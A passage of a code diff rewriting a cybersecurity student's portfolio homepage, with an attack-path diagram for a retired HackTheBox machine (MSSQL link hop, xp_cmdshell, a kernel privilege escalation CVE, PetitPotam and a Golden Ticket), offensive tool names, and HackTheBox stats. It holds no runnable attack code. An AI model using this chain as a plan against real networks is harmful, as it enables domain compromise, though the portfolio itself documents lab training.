@@ -1,596 +1,913 @@
 ---
-import { existsSync } from 'node:fs';
-import { getCollection } from 'astro:content';
 import BaseLayout from '../layouts/BaseLayout.astro';
-import WriteupFeature from '../components/WriteupFeature.astro';
-import ContactForm from '../components/ContactForm.astro';
-
-// The export hardcoded three invented writeups. These come from the content
-// collection: featured entries, newest first, top three.
-const featured = (await getCollection('writeups'))
-  .filter((w) => w.data.featured)
-  .sort((a, b) => b.data.date.valueOf() - a.data.date.valueOf())
-  .slice(0, 3);
-
-// Real box art, the same source the writeups listing uses. The export's stock
-// photography was cycled by position, so a given photo stood for whichever box
-// happened to land in that slot. Resolved at build; a box without an avatar
-// falls back to the code motif rather than 404ing.
-const avatarFor = (slug: string) => {
-  const box = slug.replace(/^htb-/, '');
-  return existsSync(`public/og-avatars/${box}.png`) ? `/og-avatars/${box}.png` : null;
-};
-
-// The section is called Security Arsenal but never showed an actual tool. Every
-// entry here appears in a published writeup or on the about page: nothing
-// aspirational. Rendered with the tool-pill treatment from Page_14's sidebar.
-const toolkit = [
-  { label: 'Recon', tools: ['nmap', 'ffuf', 'gobuster'] },
-  { label: 'Active Directory', tools: ['BloodHound', 'impacket', 'Rubeus', 'crackmapexec'] },
-  { label: 'Creds & post-ex', tools: ['hashcat', 'Responder', 'evil-winrm'] },
-];
-
-// Read as a roadmap, not a trophy shelf: none of these are held yet, which the
-// card says outright. `current` marks the one with a date attached.
-const certs = [
-  { name: 'CJCA', issuer: 'HackTheBox', status: 'EXAM BOOKED', current: true },
-  { name: 'CPTS', issuer: 'HackTheBox', status: 'NEXT', current: false },
-  { name: 'CCNA', issuer: 'Cisco', status: 'PLANNED', current: false },
-];
 ---
 
 <BaseLayout
   title="Certifa"
-  description="Offensive security student. I take apart Active Directory environments, web applications, and Linux boxes, then write down exactly how."
-  effects
+  description="Offensive security student in the Netherlands. I break Active Directory, Linux and web targets on HackTheBox, then write down exactly how."
 >
-  <!-- Export used pt-32/pt-48 measured from the top of the page; main already
-       clears the 4rem nav, so these are the remainder. -->
-  <div class="w-full pt-16 md:pt-32 pb-24">
-    <!-- ================= HERO ================= -->
-    <section class="max-w-7xl mx-auto px-6 md:px-12 grid grid-cols-1 lg:grid-cols-2 gap-16 items-start relative isolate mb-32">
-      <!-- WebGL ASCII field from the export, driven by the AIDesigner runtime
-           loaded at the bottom of this page. -->
-      <div
-        data-aifx="ascii"
-        data-aifx-colors="#030805,#081a10,#103820,#4ade80"
-        data-aifx-bg="#09090b"
-        data-aifx-bg-alpha="0"
-        data-aifx-speed="0.25"
-        data-aifx-scale="1.2"
-        data-aifx-glow="0.6"
-        class="hero-field absolute inset-[0_0_10%_0] -z-10 pointer-events-none opacity-70 [mask-image:radial-gradient(ellipse_at_center,black_40%,transparent_80%)]"
-        aria-hidden="true"
-      ></div>
+<div id="boot">
+  <div class="bwrap">
+    <p class="bmark">Certifa</p>
+    <div class="brow"><span id="bstage">Loading environment</span><span class="bpct" id="bpct">0%</span></div>
+    <div class="btrack"><i class="bfill" id="bfill"></i></div>
+    <p class="bfile" id="bfile"></p>
+  </div>
+</div>
 
-      <!-- Left: typography & CTAs -->
-      <div class="hero-copy flex flex-col items-start text-left z-10 lg:sticky lg:top-32">
-        <div class="flex items-center gap-3 mb-8">
-          <span class="font-mono text-[10px] text-zinc-400 uppercase tracking-widest">
-            OFFENSIVE SECURITY STUDENT <span class="text-accent font-bold">_</span>
-          </span>
-        </div>
+<span id="top"></span>
 
-        <h1 class="font-display text-5xl md:text-6xl lg:text-[4rem] font-bold tracking-tight leading-[1.05] text-white mb-8">
-          Break systems.<br />
-          <span class="text-accent">Document truth.</span>
-        </h1>
+<nav class="nav" id="nav">
+  <a class="nav-mark" href="v8.html">Certifa</a>
+  <div class="nav-links">
+    <a href="v8.html" aria-current="page">Home</a>
+    <a href="about.html">About</a>
+    <a href="writeups.html">Writeups</a>
+    <a href="projects.html">Projects</a>
+    <a href="contact.html">Contact</a>
+  </div>
+  <a class="nav-out" href="https://github.com/Certifa" target="_blank" rel="noopener">GitHub</a>
+</nav>
 
-        <p class="font-mono text-[13px] text-zinc-300 max-w-[28rem] leading-relaxed mb-12">
-          I break Active Directory, Linux, and web targets on HackTheBox, then write down exactly how. Looking for my first red-team seat.
-        </p>
+<section class="hero">
+<div id="stage"></div>
+<div id="vig"></div>
+<div id="grain"></div>
 
-        <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-4 w-full sm:w-auto">
-          <a href="#logs" class="w-full sm:w-auto px-8 py-3 rounded-[3px] border border-border bg-surface text-white font-mono text-[10px] uppercase tracking-widest hover:bg-surfaceHover hover:border-borderHover transition-colors flex items-center justify-center text-center">
-            VIEW WRITEUPS
-          </a>
-          <a href="#infrastructure" class="w-full sm:w-auto px-8 py-3 rounded-[3px] border border-border bg-surface text-white font-mono text-[10px] uppercase tracking-widest hover:bg-surfaceHover hover:border-borderHover transition-colors flex items-center justify-center text-center">
-            VIEW ARSENAL
-          </a>
-        </div>
-      </div>
+<div class="copy">
+  <p class="kicker" id="kicker">Offensive Security Student &nbsp;/&nbsp; NL</p>
+  <h1 class="strike">
+    <span class="ln"><span class="i">Break systems.</span></span>
+    <span class="ln crimson"><span class="i">Document truth.</span></span>
+  </h1>
+  <span class="slash" id="slash"></span>
+  <p class="whoami" id="whoami">I break Active Directory, Linux, and web targets on HackTheBox, then write down exactly how. <b>Looking for my first red-team seat.</b></p>
+</div>
 
-      <!-- Right: static attack-path graph. The box it charts is retired, so the
-           panel links to its writeup: see "The hero graph must show a retired
-           box" in CLAUDE.md before swapping in another machine. -->
-      <div class="flex flex-col w-full z-10">
-        <a
-          href="/writeups/htb-darkzero/"
-          aria-label="DarkZero writeup"
-          class="group relative block w-full rounded-lg overflow-hidden border border-accent/30 bg-surface/90 backdrop-blur p-6 lg:p-8 shadow-[0_0_50px_rgba(74,222,128,0.08)] hover:border-accent/60 hover:shadow-[0_0_60px_rgba(74,222,128,0.14)] transition-all duration-500"
-        >
-          <div class="relative z-20 flex items-start justify-between gap-4 mb-4">
-            <span class="font-mono text-[9px] text-zinc-400 group-hover:text-white uppercase tracking-widest transition-colors flex items-center gap-2">
-              DarkZero · HTB · Hard
-              <svg class="w-3 h-3 text-accent opacity-0 -translate-x-1 group-hover:opacity-100 group-hover:translate-x-0 transition-all duration-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-            </span>
-            <div class="hidden sm:flex flex-col gap-3 font-mono text-[9px] text-muted shrink-0">
-              <div class="flex items-center gap-3">
-                <span class="w-6 h-[1.5px] bg-accent"></span> Foothold Chain
-              </div>
-              <div class="flex items-center gap-3">
-                <span class="w-6 border-t border-dashed border-zinc-600"></span> Objectives
-              </div>
-            </div>
-          </div>
+<div class="stagelbl" id="stagelbl"><span class="s"></span><span class="w"></span></div>
+<div class="tag">Certifa &nbsp;/&nbsp; DarkZero &nbsp;·&nbsp; HTB &nbsp;·&nbsp; Hard</div>
+</section>
+<!-- ================= ACT II ================= -->
+<section class="chapter" id="chapter">
+  <h2 class="chapter-head">Why know a little <em>when you can know it all.</em></h2>
 
-          <div class="relative z-20 w-full flex items-center justify-center">
-            <svg viewBox="0 0 400 560" class="w-full h-auto attack-graph" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="DarkZero attack path: domain credentials into MSSQL, a linked-server hop to the second domain, xp_cmdshell for execution as the SQL service account, CVE-2024-30088 for SYSTEM on DC02, then user.txt on one branch and, on the other, Rubeus with PetitPotam capturing the DC01 ticket, a Golden Ticket forged from the krbtgt key, and root.txt.">
-              <defs>
-                <marker id="arrow-accent" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="4" markerHeight="4" orient="auto-start-reverse">
-                  <path d="M 0 0 L 10 5 L 0 10 z" class="arrow-primary" />
-                </marker>
-                <marker id="arrow-gray" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="4" markerHeight="4" orient="auto-start-reverse">
-                  <path d="M 0 0 L 10 5 L 0 10 z" class="arrow-secondary" />
-                </marker>
-                <pattern id="dotGrid" width="20" height="20" patternUnits="userSpaceOnUse">
-                  <circle cx="2" cy="2" r="1" class="grid-dot" />
-                </pattern>
-              </defs>
+  <div class="facts">
+    <div class="fact">
+      <p class="k">The Lab</p>
+      <p class="v">Windows Server 2022 + two workstations</p>
+      <p class="d">Every chain I read about gets rebuilt at home, outside the platform. Kerberos abuse, BloodHound paths, NTLM relay.</p>
+    </div>
+    <div class="fact">
+      <p class="k">The Targets</p>
+      <p class="v">Active Directory, Linux, web</p>
+      <p class="d">HackTheBox machines, taken apart and written up in full. Four on the record so far.</p>
+    </div>
+    <div class="fact">
+      <p class="k">The Study</p>
+      <p class="v">Cybersecurity &amp; Cloud BSc</p>
+      <p class="d">Hogeschool Utrecht. In progress, alongside everything else here.</p>
+    </div>
+    <div class="fact">
+      <p class="k">The Goal</p>
+      <p class="v">First red-team seat</p>
+      <p class="d">Internships, CTF teams, or feedback on a writeup. <span>mike@certifa.net</span></p>
+    </div>
+  </div>
 
-              <rect width="100%" height="100%" fill="url(#dotGrid)" />
-
-              <!-- Primary path -->
-              <path d="M 200 45 L 200 60" class="edge-primary" marker-end="url(#arrow-accent)" />
-              <path d="M 200 95 L 200 110" class="edge-primary" marker-end="url(#arrow-accent)" />
-              <path d="M 200 145 L 200 160" class="edge-primary" marker-end="url(#arrow-accent)" />
-              <path d="M 200 195 L 200 210" class="edge-primary" marker-end="url(#arrow-accent)" />
-              <path d="M 200 245 L 200 260" class="edge-primary" marker-end="url(#arrow-accent)" />
-              <path d="M 200 305 L 200 320" class="edge-primary" marker-end="url(#arrow-accent)" />
-
-              <!-- Secondary paths -->
-              <path d="M 200 355 L 200 370 L 100 370 L 100 380" class="edge-secondary" marker-end="url(#arrow-gray)" />
-              <path d="M 200 355 L 200 370 L 255 370 L 255 380" class="edge-secondary" marker-end="url(#arrow-gray)" />
-              <path d="M 255 415 L 255 440" class="edge-secondary" marker-end="url(#arrow-gray)" />
-              <path d="M 255 475 L 255 490 L 200 490 L 200 500" class="edge-secondary" marker-end="url(#arrow-gray)" />
-              <path d="M 100 415 L 100 490 L 200 490" class="edge-secondary" />
-
-              <rect x="120" y="15" width="160" height="30" class="node-rect" />
-              <text x="200" y="31" class="node-text">john.w · domain creds</text>
-              <circle cx="100" cy="30" r="8" class="node-num-circle" />
-              <text x="100" y="31" class="node-num">1</text>
-
-              <rect x="120" y="65" width="160" height="30" class="node-rect" />
-              <text x="200" y="81" class="node-text">MSSQL 1433 · DC01</text>
-              <circle cx="100" cy="80" r="8" class="node-num-circle" />
-              <text x="100" y="81" class="node-num">2</text>
-
-              <rect x="120" y="115" width="160" height="30" class="node-rect" />
-              <text x="200" y="131" class="node-text">use_link → DC02.ext</text>
-              <circle cx="100" cy="130" r="8" class="node-num-circle" />
-              <text x="100" y="131" class="node-num">3</text>
-
-              <rect x="120" y="165" width="160" height="30" class="node-rect" />
-              <text x="200" y="181" class="node-text">xp_cmdshell → RCE</text>
-              <circle cx="100" cy="180" r="8" class="node-num-circle" />
-              <text x="100" y="181" class="node-num">4</text>
-
-              <rect x="120" y="215" width="160" height="30" class="node-rect" />
-              <text x="200" y="231" class="node-text">Meterpreter · svc_sql</text>
-              <circle cx="100" cy="230" r="8" class="node-num-circle" />
-              <text x="100" y="231" class="node-num">5</text>
-
-              <rect x="120" y="265" width="160" height="40" class="node-rect" />
-              <text x="200" y="280" class="node-text">winPEAS → CVE-2024-30088</text>
-              <text x="200" y="294" class="node-text">kernel LPE</text>
-              <circle cx="100" cy="285" r="8" class="node-num-circle" />
-              <text x="100" y="286" class="node-num">6</text>
-
-              <rect x="120" y="325" width="160" height="30" class="node-rect" />
-              <text x="200" y="341" class="node-text">SYSTEM on DC02</text>
-              <circle cx="100" cy="340" r="8" class="node-num-circle" />
-              <text x="100" y="341" class="node-num">7</text>
-
-              <rect x="50" y="385" width="100" height="30" class="node-rect" />
-              <text x="100" y="401" class="node-text">user.txt</text>
-              <circle cx="30" cy="400" r="8" class="node-num-circle" />
-              <text x="30" y="401" class="node-num">8</text>
-
-              <rect x="180" y="385" width="150" height="40" class="node-rect" />
-              <text x="255" y="400" class="node-text">Rubeus + PetitPotam</text>
-              <text x="255" y="414" class="node-text">→ DC01 TGT</text>
-              <circle cx="160" cy="405" r="8" class="node-num-circle" />
-              <text x="160" y="406" class="node-num">8</text>
-
-              <rect x="180" y="445" width="150" height="30" class="node-rect" />
-              <text x="255" y="461" class="node-text">krbtgt → Golden Ticket</text>
-              <circle cx="160" cy="460" r="8" class="node-num-circle" />
-              <text x="160" y="461" class="node-num">9</text>
-
-              <rect x="120" y="505" width="160" height="30" class="node-rect-accent" />
-              <text x="200" y="521" class="node-text-accent">root.txt</text>
-              <circle cx="100" cy="520" r="8" class="node-num-circle" />
-              <text x="100" y="521" class="node-num">10</text>
-            </svg>
-          </div>
-        </a>
-      </div>
-    </section>
-
-    <!-- Divider -->
-    <div class="max-w-7xl mx-auto px-6 md:px-12">
-      <div class="w-full h-px bg-gradient-to-r from-border to-transparent mb-24"></div>
+  <div class="twoup">
+    <div class="codeblock">
+      <div class="codebar"><span><b>nmapfullscan.py</b></span><span>python</span></div>
+<pre class="code" id="code"><span class="cl"><span class="cm"># open ports come from the grepable "Ports:" line.</span></span><span class="cl"><span class="cm"># regex on free text kept missing them.</span></span><span class="cl">entries = [e.<span class="fn">strip</span>() <span class="kw">for</span> e <span class="kw">in</span> ports_field.<span class="fn">split</span>(<span class="st">","</span>)]</span><span class="cl"><span class="kw">for</span> e <span class="kw">in</span> entries:</span><span class="cl">    parts = e.<span class="fn">split</span>(<span class="st">"/"</span>)</span><span class="cl">    <span class="kw">if</span> <span class="fn">len</span>(parts) &gt;= 3:</span><span class="cl">        port_s, state, proto = parts[0], parts[1], parts[2]</span><span class="cl">        <span class="kw">if</span> proto == <span class="st">"tcp"</span> <span class="kw">and</span> state == <span class="st">"open"</span> <span class="kw">and</span> port_s.<span class="fn">isdigit</span>():</span><span class="cl">            open_ports.<span class="fn">append</span>(port_s)</span><span class="cl">&nbsp;</span><span class="cl">open_ports = <span class="fn">sorted</span>(<span class="fn">set</span>(open_ports), key=<span class="kw">lambda</span> x: <span class="fn">int</span>(x))<span class="caret"></span></span></pre>
     </div>
 
-    <!-- ================= WRITEUPS ================= -->
-    <section id="logs" class="max-w-7xl mx-auto px-6 md:px-12 mb-40">
-      <div class="flex items-center gap-4 mb-16" data-reveal>
-        <div class="w-1 h-6 bg-accent"></div>
-        <h2 class="text-2xl font-mono tracking-tight text-white">Threat Intelligence Logs</h2>
-      </div>
-
-      <div class="flex flex-col gap-24">
-        {featured.map((w, i) => (
-          <WriteupFeature
-            slug={w.slug}
-            title={w.data.title}
-            description={w.data.description}
-            tags={w.data.tags}
-            difficulty={w.data.difficulty}
-            platform={w.data.platform}
-            kicker={i === 0 ? 'RECENT' : 'ARCHIVE'}
-            flip={i % 2 === 1}
-            avatar={avatarFor(w.slug)}
-          />
-        ))}
-      </div>
-
-      <div class="mt-20 flex justify-center" data-reveal>
-        <a href="/writeups" class="px-8 py-3 rounded-[3px] border border-border font-mono text-[10px] uppercase tracking-widest text-white hover:bg-white/5 hover:border-borderHover flex items-center gap-2 transition-all">
-          All writeups
-          <svg class="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-        </a>
-      </div>
-    </section>
-
-    <!-- ================= ARSENAL ================= -->
-    <section id="infrastructure" class="max-w-7xl mx-auto px-6 md:px-12 mb-40">
-      <div class="mb-12" data-reveal>
-        <h2 class="font-display text-3xl font-semibold tracking-tighter text-white mb-2">Security Arsenal</h2>
-        <p class="text-muted">The tools I reach for, the lab I run them against, and what's next on the list.</p>
-      </div>
-
-      <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-        <!-- Tooling -->
-        <div class="spotlight-card group md:col-span-2 h-auto md:h-[400px]" data-reveal>
-          <div class="spotlight-content p-8 flex flex-col justify-between overflow-hidden relative">
-            <div class="absolute inset-0 bg-gradient-to-br from-white/[0.03] to-transparent pointer-events-none"></div>
-            <div class="scan-line hidden md:block"></div>
-
-            <div class="relative z-10">
-              <div class="flex items-center gap-3 mb-4">
-                <div class="w-8 h-8 rounded-lg bg-accent/10 flex items-center justify-center text-accent border border-accent/20">
-                  <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 17l6-6-6-6M12 19h8"/></svg>
-                </div>
-                <h3 class="font-medium text-white">Custom Tooling &amp; Automation</h3>
-              </div>
-              <p class="text-muted text-sm max-w-md">
-                A Python orchestrator that chains recon on every box: nmap fingerprints the services, the parsed results pick the wordlists, and ffuf and gobuster fill in one report template.
-              </p>
-            </div>
-
-            <div class="relative z-10 w-full bg-[#0d0d0f] border border-border rounded-lg mt-6 p-4 shadow-2xl transform translate-y-4 group-hover:translate-y-0 transition-transform duration-500">
-              <div class="flex items-center gap-2 mb-4 border-b border-border pb-3">
-                <span class="w-1.5 h-1.5 rounded-full bg-accent/60"></span>
-                <span class="font-mono text-[10px] text-muted uppercase tracking-widest">recon.py</span>
-              </div>
-              <pre class="font-mono text-xs leading-relaxed overflow-x-auto text-zinc-400"><code><span class="text-purple-400">def</span> <span class="text-blue-400">enumerate</span>(target):
-    services = <span class="text-blue-400">nmap</span>(target, <span class="text-teal-400">flags</span>=<span class="text-green-400">"-sC -sV"</span>)
-
-    <span class="text-purple-400">for</span> svc <span class="text-purple-400">in</span> services:
-        <span class="text-purple-400">if</span> svc.name <span class="text-purple-400">in</span> (<span class="text-green-400">"http"</span>, <span class="text-green-400">"https"</span>):
-            <span class="text-blue-400">ffuf</span>(svc, wordlist=<span class="text-blue-400">pick</span>(svc))
-
-    <span class="text-purple-400">return</span> <span class="text-blue-400">report</span>(target, services)</code></pre>
-            </div>
+    <div class="htb">
+      <div class="htb-bar"><span><b>HackTheBox</b></span><span>Master &middot; lvl 75</span></div>
+      <div class="htb-body">
+        <div>
+          <div class="rankrow">
+            <p class="rankname">Master</p>
+            <p class="rankpts"><b data-count="720">0</b>points</p>
           </div>
+          <div class="progress"><i id="progfill"></i></div>
+          <p class="ptext">1002 / 2826 XP to level 76</p>
         </div>
-
-        <!-- Certifications -->
-        <div class="spotlight-card md:col-span-1 h-auto md:h-[400px]" data-reveal data-reveal-delay="1">
-          <div class="spotlight-content p-8 flex flex-col relative overflow-hidden">
-            <div class="absolute top-0 right-0 w-48 h-48 bg-accent/5 rounded-full blur-3xl -translate-y-1/2 translate-x-1/2"></div>
-
-            <div class="flex items-center gap-3 mb-2">
-              <div class="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center text-white border border-border">
-                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="9" r="6"/><path d="M8.5 14.5L7 22l5-3 5 3-1.5-7.5"/></svg>
-              </div>
-              <h3 class="font-medium text-white">Certification Roadmap</h3>
-            </div>
-            <p class="text-muted text-sm mb-6">None held yet. This is the order they land in.</p>
-
-            <!-- Vertical rail, borrowing the node-and-path language the attack
-                 graph already establishes: filled node for the booked exam,
-                 hollow for what is still ahead. -->
-            <ol class="relative z-10 flex flex-col">
-              {certs.map((c, i) => (
-                <li class="relative flex gap-4 pb-6 last:pb-0">
-                  {i < certs.length - 1 && (
-                    <span class="absolute left-[5px] top-4 bottom-0 w-px bg-border" aria-hidden="true"></span>
-                  )}
-                  <span
-                    class:list={[
-                      'mt-1.5 w-[11px] h-[11px] rounded-full shrink-0 border',
-                      c.current ? 'bg-accent border-accent' : 'bg-bg border-borderHover',
-                    ]}
-                    aria-hidden="true"
-                  ></span>
-                  <div class="flex-1 min-w-0">
-                    <div class="flex items-baseline justify-between gap-3">
-                      <span class:list={['text-sm font-medium', c.current ? 'text-white' : 'text-zinc-300']}>{c.name}</span>
-                      <span
-                        class:list={[
-                          'font-mono text-[10px] tracking-wider shrink-0',
-                          c.current ? 'text-accent bg-accent/10 px-2 py-0.5 rounded' : 'text-muted',
-                        ]}
-                      >{c.status}</span>
-                    </div>
-                    <p class="text-[11px] font-mono text-muted mt-1">{c.issuer}</p>
-                  </div>
-                </li>
-              ))}
-            </ol>
-
-            <p class="relative z-10 mt-auto pt-6 border-t border-border text-[11px] font-mono text-muted leading-relaxed">
-              Also in progress: Cybersecurity &amp; Cloud BSc, Hogeschool Utrecht.
-            </p>
-          </div>
-        </div>
-
-        <!-- Toolkit -->
-        <div class="spotlight-card md:col-span-1 h-auto md:h-[360px]" data-reveal data-reveal-delay="2">
-          <div class="spotlight-content p-8 flex flex-col relative overflow-hidden">
-            <div class="absolute -top-16 -right-16 w-48 h-48 bg-accent/[0.07] rounded-full blur-3xl"></div>
-
-            <div class="flex items-center gap-3 mb-6">
-              <div class="w-8 h-8 rounded-lg bg-accent/10 flex items-center justify-center text-accent border border-accent/20">
-                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3"/><path d="M12 3v2M12 19v2M3 12h2M19 12h2"/></svg>
-              </div>
-              <h3 class="font-medium text-white">The Toolkit</h3>
-            </div>
-
-            <div class="relative z-10 flex flex-col gap-5">
-              {toolkit.map((g) => (
-                <div>
-                  <h4 class="text-[10px] font-mono text-muted uppercase tracking-widest mb-2">{g.label}</h4>
-                  <div class="flex flex-wrap gap-1.5">
-                    {g.tools.map((t) => (
-                      <span class="px-2 py-1 border border-border rounded text-[11px] font-mono text-zinc-400 bg-bg">{t}</span>
-                    ))}
-                  </div>
-                </div>
-              ))}
-            </div>
-          </div>
-        </div>
-
-        <!-- Homelab -->
-        <div class="spotlight-card md:col-span-2 h-auto md:h-[360px]" data-reveal data-reveal-delay="3">
-          <div class="spotlight-content p-8 flex flex-col md:flex-row items-center gap-8 relative overflow-hidden">
-            <div class="absolute -bottom-24 -left-24 w-64 h-64 bg-accent/10 rounded-full blur-3xl"></div>
-
-            <div class="w-full md:w-1/2">
-              <div class="flex items-center gap-3 mb-4">
-                <div class="w-8 h-8 rounded-lg bg-accent/10 flex items-center justify-center text-accent border border-accent/20">
-                  <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="4" width="18" height="7" rx="1"/><rect x="3" y="14" width="18" height="6" rx="1"/><path d="M7 7.5h.01M7 17h.01"/></svg>
-                </div>
-                <h3 class="font-medium text-white">Active Directory Homelab</h3>
-              </div>
-              <p class="text-muted text-sm leading-relaxed mb-6">
-                A Windows Server 2022 domain controller and two workstations at home, so every chain I read about gets rebuilt outside the platform: Kerberos abuse, BloodHound paths, NTLM relay.
-              </p>
-              <a href="/projects" class="inline-flex items-center gap-2 text-sm text-white font-medium hover:text-accent transition-colors">
-                See the lab
-                <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-              </a>
-            </div>
-
-            <div class="w-full md:w-1/2 relative rounded-2xl overflow-hidden border border-border bg-bg p-6 flex items-center justify-center">
-              <svg viewBox="0 0 320 130" class="w-full h-auto max-h-56 attack-graph" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Home lab topology: a Server 2022 domain controller with two joined workstations.">
-                <defs>
-                  <pattern id="labDots" width="20" height="20" patternUnits="userSpaceOnUse">
-                    <circle cx="2" cy="2" r="1" class="grid-dot" />
-                  </pattern>
-                </defs>
-                <rect width="100%" height="100%" fill="url(#labDots)" />
-
-                <path d="M 160 46 L 160 68" class="edge-primary" />
-                <path d="M 160 68 L 70 68 L 70 90" class="edge-secondary" />
-                <path d="M 160 68 L 250 68 L 250 90" class="edge-secondary" />
-
-                <rect x="90" y="18" width="140" height="28" class="node-rect-accent" />
-                <text x="160" y="33" class="node-text-accent">DC01 · Server 2022</text>
-
-                <rect x="25" y="90" width="90" height="28" class="node-rect" />
-                <text x="70" y="105" class="node-text">WS01</text>
-
-                <rect x="205" y="90" width="90" height="28" class="node-rect" />
-                <text x="250" y="105" class="node-text">WS02</text>
-              </svg>
-            </div>
-          </div>
+        <div class="htb-grid">
+          <div class="hcell"><p class="num" data-count="72">0</p><p class="cap">Machines</p></div>
+          <div class="hcell"><p class="num" data-count="34">0</p><p class="cap">Challenges</p></div>
+          <div class="hcell"><p class="num" data-count="425">0</p><p class="cap">Season 11 rank</p></div>
         </div>
       </div>
-    </section>
-
-    <!-- ================= CONTACT ================= -->
-    <section id="contact" class="max-w-5xl mx-auto px-6 md:px-12 mb-8" data-reveal>
-      <div class="rounded-2xl border border-border bg-surface p-8 md:p-12 flex flex-col lg:flex-row gap-12 items-stretch">
-        <div class="w-full lg:w-[45%] flex flex-col justify-between gap-8">
-          <div>
-            <h2 class="font-display text-3xl font-semibold tracking-tighter text-white mb-4">
-              Get in touch.
-            </h2>
-            <p class="text-muted text-sm leading-relaxed max-w-md">
-              CTF teams, internship leads, or feedback on a writeup. Pick a channel, they all reach me.
-            </p>
-          </div>
-
-          <div class="flex flex-wrap gap-2.5">
-            <a href="mailto:mike@certifa.net" class="touch-pill flex items-center gap-2 px-3 py-1.5 rounded-full border border-border bg-white/[0.02] hover:bg-white/10 hover:text-white transition-colors text-xs font-mono text-muted">
-              <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m2 7 10 6 10-6"/></svg>
-              mike@certifa.net
-            </a>
-            <a href="https://github.com/Certifa" rel="me noopener" class="touch-pill flex items-center gap-2 px-3 py-1.5 rounded-full border border-border bg-white/[0.02] hover:bg-white/10 hover:text-white transition-colors text-xs font-mono text-muted">
-              <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2C6.5 2 2 6.6 2 12.3c0 4.5 2.9 8.3 6.8 9.7.5.1.7-.2.7-.5v-1.7c-2.8.6-3.4-1.4-3.4-1.4-.4-1.2-1.1-1.5-1.1-1.5-.9-.6.1-.6.1-.6 1 .1 1.5 1 1.5 1 .9 1.6 2.4 1.1 3 .9.1-.7.4-1.1.6-1.4-2.2-.3-4.6-1.1-4.6-5.1 0-1.1.4-2 1-2.7-.1-.3-.4-1.3.1-2.7 0 0 .8-.3 2.7 1a9 9 0 0 1 5 0c1.9-1.3 2.7-1 2.7-1 .5 1.4.2 2.4.1 2.7.6.7 1 1.6 1 2.7 0 4-2.4 4.8-4.6 5.1.4.3.7.9.7 1.9v2.8c0 .3.2.6.7.5 3.9-1.4 6.8-5.2 6.8-9.7C22 6.6 17.5 2 12 2z"/></svg>
-              github/Certifa
-            </a>
-            <a href="https://app.hackthebox.com/users/Certifa" rel="me noopener" class="touch-pill flex items-center gap-2 px-3 py-1.5 rounded-full border border-border bg-white/[0.02] hover:bg-white/10 hover:text-white transition-colors text-xs font-mono text-muted">
-              <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2 3.5 7v10L12 22l8.5-5V7L12 2zm0 2.3 6.5 3.8-6.5 3.8-6.5-3.8L12 4.3zM5.5 9.6l5.5 3.2v6.5l-5.5-3.2V9.6zm7.5 9.7v-6.5l5.5-3.2v6.5l-5.5 3.2z"/></svg>
-              hackthebox
-            </a>
-            <a href="https://www.linkedin.com/in/certifa" rel="me noopener" class="touch-pill flex items-center gap-2 px-3 py-1.5 rounded-full border border-border bg-white/[0.02] hover:bg-white/10 hover:text-white transition-colors text-xs font-mono text-muted">
-              <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M4.98 3.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5zM3 9h4v12H3zM9 9h3.8v1.7h.05c.53-.95 1.83-1.95 3.75-1.95 4 0 4.4 2.5 4.4 5.8V21h-4v-5.6c0-1.35-.03-3.1-1.9-3.1-1.9 0-2.2 1.45-2.2 3v5.7H9z"/></svg>
-              linkedin
-            </a>
-            <button type="button" data-copy="Quetro" class="touch-pill flex items-center gap-2 px-3 py-1.5 rounded-full border border-border bg-white/[0.02] hover:bg-white/10 hover:text-white transition-colors text-xs font-mono text-muted">
-              <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19.3 5.3A16 16 0 0 0 15.2 4l-.2.4a15 15 0 0 1 3.6 1.3 12 12 0 0 0-9.2 0A15 15 0 0 1 13 4.4L12.8 4a16 16 0 0 0-4.1 1.3C5.9 9.5 5.2 13.6 5.5 17.6A16 16 0 0 0 10.4 20l.6-1a11 11 0 0 1-1.8-.9l.4-.3a11.5 11.5 0 0 0 9.8 0l.4.3a11 11 0 0 1-1.8.9l.6 1a16 16 0 0 0 4.9-2.4c.4-4.6-.7-8.7-3-12.3zM9.7 15.2c-1 0-1.8-.9-1.8-2s.8-2 1.8-2 1.8.9 1.8 2-.8 2-1.8 2zm4.6 0c-1 0-1.8-.9-1.8-2s.8-2 1.8-2 1.8.9 1.8 2-.8 2-1.8 2z"/></svg>
-              discord · Quetro
-            </button>
